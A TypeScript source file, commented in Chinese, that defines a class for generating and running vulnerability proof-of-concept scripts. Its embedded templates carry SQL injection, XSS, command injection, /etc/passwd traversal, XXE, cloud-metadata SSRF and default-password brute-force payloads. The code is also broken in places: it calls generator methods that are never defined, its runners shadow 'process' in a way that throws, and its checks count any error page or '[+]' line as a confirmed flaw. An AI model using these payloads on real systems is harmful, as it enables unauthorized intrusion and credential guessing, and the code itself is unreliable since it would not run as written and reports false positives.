import { spawn } from 'child_process';
import { v4 as uuidv4 } from 'uuid';
import winston from 'winston';
import fs from 'fs/promises';
import path from 'path';

export interface VulnerabilityInfo {
  id: string;
  type: string;
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  component: string;
  cveId?: string;
  affectedVersion?: string;
  attackVector?: string;
  impact?: string;
  remediation?: string;
  references?: string[];
}

export interface POCExecution {
  id: string;
  vulnerabilityId: string;
  code: string;
  language: string;
  description: string;
  target: string;
  parameters: Record<string, any>;
  timeout: number;
  sandboxed: boolean;
}

export interface POCResult {
  success: boolean;
  vulnerabilityConfirmed: boolean;
  output: string;
  error?: string;
  executionTime: number;
  reliabilityScore: number; // 0-100
  evidence?: {
    screenshots?: string[];
    logs?: string[];
    networkTraffic?: any[];
  };
}

export class POCManager {
  private logger: winston.Logger;
  private pocStoragePath: string;
  private sandboxPath: string;

  constructor() {
    this.logger = winston.createLogger({
      level: 'info',
      format: winston.format.json(),
      transports: [
        new winston.transports.File({ filename: 'logs/poc-manager.log' }),
        new winston.transports.Console()
      ]
    });

    this.pocStoragePath = path.join(process.cwd(), 'poc-codes');
    this.sandboxPath = path.join(process.cwd(), 'sandbox');
    this.initializeStorage();
  }

  private async initializeStorage(): Promise<void> {
    try {
      await fs.mkdir(this.pocStoragePath, { recursive: true });
      await fs.mkdir(this.sandboxPath, { recursive: true });
      this.logger.info('POC storage initialized');
    } catch (error) {
      this.logger.error('Failed to initialize POC storage', error);
    }
  }

  async generatePOCCode(vulnerability: VulnerabilityInfo): Promise<{
    code: string;
    language: string;
    description: string;
    executionSteps: string[];
    safetyNotes: string[];
  }> {
    try {
      this.logger.info('Generating POC code', { vulnerabilityId: vulnerability.id, type: vulnerability.type });

      // 根据漏洞类型生成对应的POC代码
      switch (vulnerability.type.toLowerCase()) {
        case 'sql_injection':
          return this.generateSQLInjectionPOC(vulnerability);
        case 'xss':
          return this.generateXSSPOC(vulnerability);
        case 'command_injection':
          return this.generateCommandInjectionPOC(vulnerability);
        case 'file_inclusion':
          return this.generateFileInclusionPOC(vulnerability);
        case 'xxe':
          return this.generateXXEPOC(vulnerability);
        case 'ssrf':
          return this.generateSSRFPOC(vulnerability);
        case 'idor':
          return this.generateIDORPOC(vulnerability);
        case 'brute_force':
          return this.generateBruteForcePOC(vulnerability);
        default:
          return this.generateGenericPOC(vulnerability);
      }
    } catch (error) {
      this.logger.error('Failed to generate POC code', error);
      throw error;
    }
  }

  private generateSQLInjectionPOC(vulnerability: VulnerabilityInfo): any {
    const code = `# SQL注入漏洞验证脚本
import requests
import sys
import time

def test_sql_injection(target_url, parameter):
    """
    验证SQL注入漏洞的POC脚本
    """
    print(f"[*] 测试目标: {target_url}")
    print(f"[*] 测试参数: {parameter}")
    
    # 基本的SQL注入测试payloads
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT null--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int, (SELECT @@version))--"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    
    for payload in payloads:
        print(f"[*] 测试Payload: {payload}")
        
        try:
            # 构造测试数据
            test_data = {parameter: payload}
            
            start_time = time.time()
            response = requests.get(target_url, params=test_data, headers=headers, timeout=10)
            end_time = time.time()
            
            # 检测SQL错误信息
            sql_errors = [
                'SQL syntax',
                'mysql_fetch_array',
                'ORA-',
                'Microsoft OLE DB Provider',
                'SQLite error',
                'PostgreSQL error'
            ]
            
            response_text = response.text.lower()
            
            # 检查是否返回SQL错误
            for error in sql_errors:
                if error.lower() in response_text:
                    print(f"[+] 发现SQL错误: {error}")
                    print(f"[+] SQL注入漏洞可能存在!")
                    return True
            
            # 检查时间盲注
            if 'waitfor' in payload.lower() and (end_time - start_time) > 4:
                print(f"[+] 时间盲注检测到延迟: {end_time - start_time}秒")
                print(f"[+] SQL注入漏洞可能存在!")
                return True
            
            # 检查响应差异
            if response.status_code == 500 or 'error' in response_text:
                print(f"[*] 检测到异常响应，可能存在漏洞")
                return True
                
            print(f"[*] 未检测到明显的SQL注入特征")
            time.sleep(0.5)  # 避免过快请求
            
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求异常: {e}")
            continue
    
    print("[-] 未确认SQL注入漏洞")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python sql_injection_poc.py <target_url> <parameter>")
        print("示例: python sql_injection_poc.py http://example.com/search.php q")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2]
    
    result = test_sql_injection(target_url, parameter)
    
    if result:
        print("\\n[!] 漏洞验证结果: SQL注入漏洞可能存在")
        print("[!] 建议进行进一步的手工验证")
    else:
        print("\\n[*] 漏洞验证结果: 未检测到SQL注入漏洞")
    
    sys.exit(0 if result else 1)`;

    return {
      code,
      language: 'python',
      description: `SQL注入漏洞验证脚本 - ${vulnerability.description}`,
      executionSteps: [
        '安装依赖: pip install requests',
        '运行脚本: python sql_injection_poc.py <target_url> <parameter>',
        '分析输出结果'
      ],
      safetyNotes: [
        '此脚本仅用于安全测试目的',
        '请在获得授权的情况下使用',
        '脚本包含延迟机制避免对目标造成压力',
        '建议使用测试环境进行验证'
      ]
    };
  }

  private generateXSSPOC(vulnerability: VulnerabilityInfo): any {
    const code = `// XSS漏洞验证脚本
const puppeteer = require('puppeteer');

async function testXSS(targetUrl, parameter) {
    console.log('[*] 测试目标: ' + targetUrl);
    console.log('[*] 测试参数: ' + parameter);
    
    const browser = await puppeteer.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    
    try {
        const page = await browser.newPage();
        
        // 设置请求拦截器
        await page.setRequestInterception(true);
        page.on('request', (request) => {
            // 阻止可能危险的资源加载
            const dangerousResources = ['.exe', '.bat', '.sh', '.dll'];
            const url = request.url();
            
            if (dangerousResources.some(ext => url.includes(ext))) {
                request.abort();
            } else {
                request.continue();
            }
        });
        
        // XSS测试payloads
        const payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\\'XSS\\')">'
        ];
        
        let vulnerable = false;
        
        for (const payload of payloads) {
            console.log('[*] 测试Payload: ' + payload);
            
            try {
                // 构造测试URL
                const testUrl = targetUrl + '?' + parameter + '=' + encodeURIComponent(payload);
                
                await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
                
                // 监听弹窗事件
                page.on('dialog', async (dialog) => {
                    console.log('[+] 检测到弹窗: ' + dialog.message());
                    vulnerable = true;
                    await dialog.dismiss();
                });
                
                // 等待可能的弹窗
                await page.waitForTimeout(2000);
                
                // 检查页面源码是否包含payload
                const content = await page.content();
                if (content.includes(payload)) {
                    console.log('[+] Payload 出现在页面源码中');
                    vulnerable = true;
                }
                
                // 检查DOM中是否存在恶意脚本
                const hasScript = await page.evaluate((payload) => {
                    return document.querySelector('script')?.innerHTML.includes('alert("XSS")') || false;
                }, payload);
                
                if (hasScript) {
                    console.log('[+] 检测到恶意脚本执行');
                    vulnerable = true;
                }
                
            } catch (error) {
                console.log('[-] 测试异常: ' + error.message);
            }
        }
        
        await browser.close();
        return vulnerable;
        
    } catch (error) {
        await browser.close();
        throw error;
    }
}

// 主函数
if (require.main === module) {
    const targetUrl = process.argv[2];
    const parameter = process.argv[3];
    
    if (!targetUrl || !parameter) {
        console.log('用法: node xss_poc.js <target_url> <parameter>');
        console.log('示例: node xss_poc.js http://example.com/search.php q');
        process.exit(1);
    }
    
    testXSS(targetUrl, parameter)
        .then((result) => {
            if (result) {
                console.log('\\n[!] 漏洞验证结果: XSS漏洞可能存在');
                console.log('[!] 建议进行进一步的手工验证');
            } else {
                console.log('\\n[*] 漏洞验证结果: 未检测到XSS漏洞');
            }
            process.exit(result ? 0 : 1);
        })
        .catch((error) => {
            console.error('测试失败:', error);
            process.exit(1);
        });
}

module.exports = { testXSS };`;

    return {
      code,
      language: 'javascript',
      description: `XSS漏洞验证脚本 - ${vulnerability.description}`,
      executionSteps: [
        '安装依赖: npm install puppeteer',
        '运行脚本: node xss_poc.js <target_url> <parameter>',
        '分析输出结果'
      ],
      safetyNotes: [
        '使用无头浏览器进行安全测试',
        '自动拦截危险资源加载',
        '包含多种XSS payload测试',
        '建议在隔离环境中运行'
      ]
    };
  }

  private generateCommandInjectionPOC(vulnerability: VulnerabilityInfo): any {
    const code = `# 命令注入漏洞验证脚本
import requests
import urllib.parse
import time
import sys

def generate_payloads():
    """生成命令注入测试payloads"""
    payloads = []
    
    # Unix/Linux 命令注入
    unix_payloads = [
        "; id",
        "| id", 
        "&& id",
        "\`id\`",
        "$(id)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; pwd",
        "; ls -la"
    ]
    
    # Windows 命令注入
    windows_payloads = [
        "& whoami",
        "&& whoami",
        "| whoami",
        "%USERNAME%",
        "& dir",
        "&& dir"
    ]
    
    # 时间盲注
    time_payloads = [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "& timeout /t 5",
        "&& timeout /t 5"
    ]
    
    return unix_payloads + windows_payloads + time_payloads

def test_command_injection(target_url, parameter):
    """
    验证命令注入漏洞的POC脚本
    """
    print(f"[*] 测试目标: {target_url}")
    print(f"[*] 测试参数: {parameter}")
    
    payloads = generate_payloads()
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    
    vulnerable = False
    
    for payload in payloads:
        print(f"[*] 测试Payload: {payload}")
        
        try:
            # 构造测试数据
            test_data = {parameter: payload}
            
            # 检测时间盲注
            if 'sleep' in payload or 'timeout' in payload:
                start_time = time.time()
                response = requests.get(target_url, params=test_data, headers=headers, timeout=10)
                end_time = time.time()
                
                if (end_time - start_time) > 4:  # 如果响应时间超过4秒
                    print(f"[+] 检测到时间延迟: {end_time - start_time}秒")
                    print(f"[+] 命令注入漏洞可能存在!")
                    vulnerable = True
                    continue
            
            # 正常测试
            response = requests.get(target_url, params=test_data, headers=headers, timeout=10)
            
            # 检测命令执行结果
            command_indicators = [
                'uid=',
                'gid=',
                'groups=',
                'root:',
                'administrator:',
                'whoami',
                'user name',
                'current user'
            ]
            
            response_text = response.text.lower()
            
            # 检查是否返回命令执行结果
            for indicator in command_indicators:
                if indicator.lower() in response_text:
                    print(f"[+] 检测到命令执行结果: {indicator}")
                    print(f"[+] 命令注入漏洞可能存在!")
                    vulnerable = True
                    break
            
            # 检查响应状态码变化
            if response.status_code == 500 or 'error' in response_text:
                print(f"[*] 检测到异常响应，可能存在漏洞")
                vulnerable = True
            
            time.sleep(0.5)  # 避免过快请求
            
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求异常: {e}")
            continue
    
    return vulnerable

def safe_test(target_url, parameter):
    """安全测试模式，使用无害的命令"""
    safe_payloads = [
        "; echo 'test'",
        "| echo 'test'",
        "&& echo 'test'",
        "& echo 'test'"
    ]
    
    print("[*] 使用安全payloads进行测试")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    
    for payload in safe_payloads:
        try:
            test_data = {parameter: payload}
            response = requests.get(target_url, params=test_data, headers=headers, timeout=10)
            
            if 'test' in response.text:
                print(f"[+] 检测到回显: {payload}")
                return True
                
        except requests.exceptions.RequestException:
            continue
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python command_injection_poc.py <target_url> <parameter>")
        print("示例: python command_injection_poc.py http://example.com/ping.php ip")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2]
    
    print("[*] 开始命令注入漏洞测试")
    result = test_command_injection(target_url, parameter)
    
    if not result:
        print("[*] 尝试安全测试模式")
        result = safe_test(target_url, parameter)
    
    if result:
        print("\\n[!] 漏洞验证结果: 命令注入漏洞可能存在")
        print("[!] 建议进行进一步的手工验证")
    else:
        print("\\n[*] 漏洞验证结果: 未检测到命令注入漏洞")
    
    sys.exit(0 if result else 1)`;

    return {
      code,
      language: 'python',
      description: `命令注入漏洞验证脚本 - ${vulnerability.description}`,
      executionSteps: [
        '安装依赖: pip install requests',
        '运行脚本: python command_injection_poc.py <target_url> <parameter>',
        '分析输出结果'
      ],
      safetyNotes: [
        '包含Unix和Windows平台的测试payloads',
        '使用时间盲注检测技术',
        '支持安全模式测试',
        '自动检测命令执行结果'
      ]
    };
  }

  private generateGenericPOC(vulnerability: VulnerabilityInfo): any {
    const code = `# 通用漏洞验证脚本
import requests
import json
import sys
import time

def generic_vulnerability_test(target_url, vulnerability_type):
    """
    通用漏洞验证脚本
    """
    print(f"[*] 测试目标: {target_url}")
    print(f"[*] 漏洞类型: {vulnerability_type}")
    
    # 根据漏洞类型选择测试方法
    test_methods = {
        'file_inclusion': test_file_inclusion,
        'xxe': test_xxe,
        'ssrf': test_ssrf,
        'idor': test_idor,
        'brute_force': test_brute_force
    }
    
    test_method = test_methods.get(vulnerability_type.lower())
    if not test_method:
        print(f"[-] 不支持的漏洞类型: {vulnerability_type}")
        return False
    
    return test_method(target_url)

def test_file_inclusion(target_url):
    """文件包含漏洞测试"""
    payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=/etc/passwd'
    ]
    
    for payload in payloads:
        try:
            response = requests.get(f"{target_url}?file={payload}", timeout=10)
            
            # 检测文件包含特征
            if 'root:' in response.text or 'daemon:' in response.text:
                print(f"[+] 检测到文件包含: {payload}")
                return True
                
        except requests.exceptions.RequestException:
            continue
    
    return False

def test_xxe(target_url):
    """XXE漏洞测试"""
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
    
    headers = {'Content-Type': 'application/xml'}
    
    try:
        response = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
        
        if 'root:' in response.text:
            print('[+] 检测到XXE漏洞')
            return True
            
    except requests.exceptions.RequestException:
        pass
    
    return False

def test_ssrf(target_url):
    """SSRF漏洞测试"""
    ssrf_payloads = [
        'http://localhost:80',
        'http://127.0.0.1:80',
        'file:///etc/passwd',
        'http://169.254.169.254/latest/meta-data/'
    ]
    
    for payload in ssrf_payloads:
        try:
            response = requests.get(f"{target_url}?url={payload}", timeout=10)
            
            # 检测SSRF特征
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] 检测到SSRF: {payload}")
                return True
                
        except requests.exceptions.RequestException:
            continue
    
    return False

def test_idor(target_url):
    """IDOR漏洞测试"""
    # 尝试不同的ID值
    for user_id in [1, 2, 3, 999, 1000]:
        try:
            test_url = target_url.replace('{id}', str(user_id))
            response = requests.get(test_url, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] 检测到IDOR: 用户ID {user_id}")
                return True
                
        except requests.exceptions.RequestException:
            continue
    
    return False

def test_brute_force(target_url):
    """暴力破解测试"""
    common_passwords = ['admin', 'password', '123456', 'root', 'test']
    
    for password in common_passwords:
        try:
            data = {'username': 'admin', 'password': password}
            response = requests.post(target_url, data=data, timeout=10)
            
            # 检测登录成功特征
            if response.status_code == 200 and 'dashboard' in response.text:
                print(f"[+] 检测到弱密码: {password}")
                return True
                
        except requests.exceptions.RequestException:
            continue
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python generic_poc.py <target_url> <vulnerability_type>")
        print("支持的漏洞类型: file_inclusion, xxe, ssrf, idor, brute_force")
        sys.exit(1)
    
    target_url = sys.argv[1]
    vulnerability_type = sys.argv[2]
    
    result = generic_vulnerability_test(target_url, vulnerability_type)
    
    if result:
        print(f"\\n[!] 漏洞验证结果: {vulnerability_type} 漏洞可能存在")
    else:
        print(f"\\n[*] 漏洞验证结果: 未检测到 {vulnerability_type} 漏洞")
    
    sys.exit(0 if result else 1)`;

    return {
      code,
      language: 'python',
      description: `通用漏洞验证脚本 - ${vulnerability.description}`,
      executionSteps: [
        '安装依赖: pip install requests',
        '运行脚本: python generic_poc.py <target_url> <vulnerability_type>',
        '支持的漏洞类型: file_inclusion, xxe, ssrf, idor, brute_force'
      ],
      safetyNotes: [
        '支持多种常见漏洞类型的检测',
        '包含安全测试payloads',
        '自动检测漏洞特征',
        '建议在授权环境下使用'
      ]
    };
  }

  async executePOC(execution: POCExecution): Promise<POCResult> {
    const startTime = Date.now();
    
    try {
      this.logger.info('Executing POC', { 
        pocId: execution.id, 
        vulnerabilityId: execution.vulnerabilityId,
        language: execution.language 
      });

      // 保存POC代码到文件
      const codeFile = await this.savePOCCode(execution);
      
      // 根据语言执行POC
      let result: POCResult;
      
      switch (execution.language.toLowerCase()) {
        case 'python':
          result = await this.executePythonPOC(codeFile, execution);
          break;
        case 'javascript':
          result = await this.executeJavaScriptPOC(codeFile, execution);
          break;
        case 'bash':
        case 'shell':
          result = await this.executeShellPOC(codeFile, execution);
          break;
        default:
          throw new Error(`Unsupported language: ${execution.language}`);
      }

      result.executionTime = Date.now() - startTime;
      
      this.logger.info('POC execution completed', {
        pocId: execution.id,
        success: result.success,
        vulnerabilityConfirmed: result.vulnerabilityConfirmed,
        executionTime: result.executionTime
      });

      return result;
    } catch (error) {
      const executionTime = Date.now() - startTime;
      
      this.logger.error('POC execution failed', {
        pocId: execution.id,
        error: error.message
      });

      return {
        success: false,
        vulnerabilityConfirmed: false,
        output: '',
        error: error.message,
        executionTime,
        reliabilityScore: 0
      };
    }
  }

  private async savePOCCode(execution: POCExecution): Promise<string> {
    const fileName = 'poc_' + execution.id + '.' + this.getFileExtension(execution.language);
    const filePath = path.join(this.pocStoragePath, fileName);
    
    await fs.writeFile(filePath, execution.code, 'utf8');
    
    return filePath;
  }

  private getFileExtension(language: string): string {
    const extensions = {
      'python': 'py',
      'javascript': 'js',
      'bash': 'sh',
      'shell': 'sh'
    };
    
    return extensions[language.toLowerCase()] || 'txt';
  }

  private async executePythonPOC(codeFile: string, execution: POCExecution): Promise<POCResult> {
    return new Promise((resolve) => {
      const args = [codeFile];
      
      // 添加目标参数
      if (execution.target) {
        args.push(execution.target);
      }
      
      // 添加其他参数
      if (execution.parameters && Object.keys(execution.parameters).length > 0) {
        args.push(...Object.values(execution.parameters));
      }

      const process = spawn('python3', args, {
        timeout: execution.timeout || 60000,
        cwd: this.sandboxPath,
        env: {
          ...process.env,
          PYTHONPATH: this.sandboxPath
        }
      });

      let stdout = '';
      let stderr = '';

      process.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      process.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      process.on('close', (code) => {
        const vulnerabilityConfirmed = this.analyzePythonOutput(stdout, stderr);
        
        resolve({
          success: code === 0,
          vulnerabilityConfirmed,
          output: stdout,
          error: stderr || undefined,
          executionTime: 0,
          reliabilityScore: vulnerabilityConfirmed ? 80 : 20
        });
      });

      process.on('error', (error) => {
        resolve({
          success: false,
          vulnerabilityConfirmed: false,
          output: stdout,
          error: error.message,
          executionTime: 0,
          reliabilityScore: 0
        });
      });
    });
  }

  private async executeJavaScriptPOC(codeFile: string, execution: POCExecution): Promise<POCResult> {
    return new Promise((resolve) => {
      const args = [codeFile];
      
      if (execution.target) {
        args.push(execution.target);
      }

      const process = spawn('node', args, {
        timeout: execution.timeout || 60000,
        cwd: this.sandboxPath
      });

      let stdout = '';
      let stderr = '';

      process.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      process.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      process.on('close', (code) => {
        const vulnerabilityConfirmed = this.analyzeJavaScriptOutput(stdout, stderr);
        
        resolve({
          success: code === 0,
          vulnerabilityConfirmed,
          output: stdout,
          error: stderr || undefined,
          executionTime: 0,
          reliabilityScore: vulnerabilityConfirmed ? 80 : 20
        });
      });

      process.on('error', (error) => {
        resolve({
          success: false,
          vulnerabilityConfirmed: false,
          output: stdout,
          error: error.message,
          executionTime: 0,
          reliabilityScore: 0
        });
      });
    });
  }

  private async executeShellPOC(codeFile: string, execution: POCExecution): Promise<POCResult> {
    return new Promise((resolve) => {
      const process = spawn('bash', [codeFile], {
        timeout: execution.timeout || 60000,
        cwd: this.sandboxPath,
        env: {
          ...process.env,
          TARGET_URL: execution.target || ''
        }
      });

      let stdout = '';
      let stderr = '';

      process.stdout.on('data', (data) => {
        stdout += data.toString();
      });

      process.stderr.on('data', (data) => {
        stderr += data.toString();
      });

      process.on('close', (code) => {
        const vulnerabilityConfirmed = this.analyzeShellOutput(stdout, stderr);
        
        resolve({
          success: code === 0,
          vulnerabilityConfirmed,
          output: stdout,
          error: stderr || undefined,
          executionTime: 0,
          reliabilityScore: vulnerabilityConfirmed ? 80 : 20
        });
      });

      process.on('error', (error) => {
        resolve({
          success: false,
          vulnerabilityConfirmed: false,
          output: stdout,
          error: error.message,
          executionTime: 0,
          reliabilityScore: 0
        });
      });
    });
  }

  private analyzePythonOutput(stdout: string, stderr: string): boolean {
    const indicators = [
      '漏洞可能存在',
      'vulnerable',
      'VULNERABILITY',
      '检测到',
      '发现',
      '[+]'
    ];
    
    return indicators.some(indicator => stdout.includes(indicator));
  }

  private analyzeJavaScriptOutput(stdout: string, stderr: string): boolean {
    const indicators = [
      'vulnerability',
      'VULNERABILITY',
      '漏洞',
      '检测到',
      '发现',
      '[!]'
    ];
    
    return indicators.some(indicator => stdout.includes(indicator));
  }

  private analyzeShellOutput(stdout: string, stderr: string): boolean {
    const indicators = [
      'VULNERABLE',
      'vulnerable',
      '漏洞',
      '成功',
      'detected'
    ];
    
    return indicators.some(indicator => stdout.includes(indicator));
  }

  async getPOCHistory(vulnerabilityId: string): Promise<any[]> {
    // 这里可以实现POC执行历史的查询
    return [];
  }

  async cleanupPOC(pocId: string): Promise<void> {
    try {
      const files = await fs.readdir(this.pocStoragePath);
      const pocFiles = files.filter(file => file.includes(pocId));
      
      for (const file of pocFiles) {
        await fs.unlink(path.join(this.pocStoragePath, file));
      }
      
      this.logger.info('POC files cleaned up', { pocId });
    } catch (error) {
      this.logger.error('Failed to cleanup POC files', { pocId, error });
    }
  }
}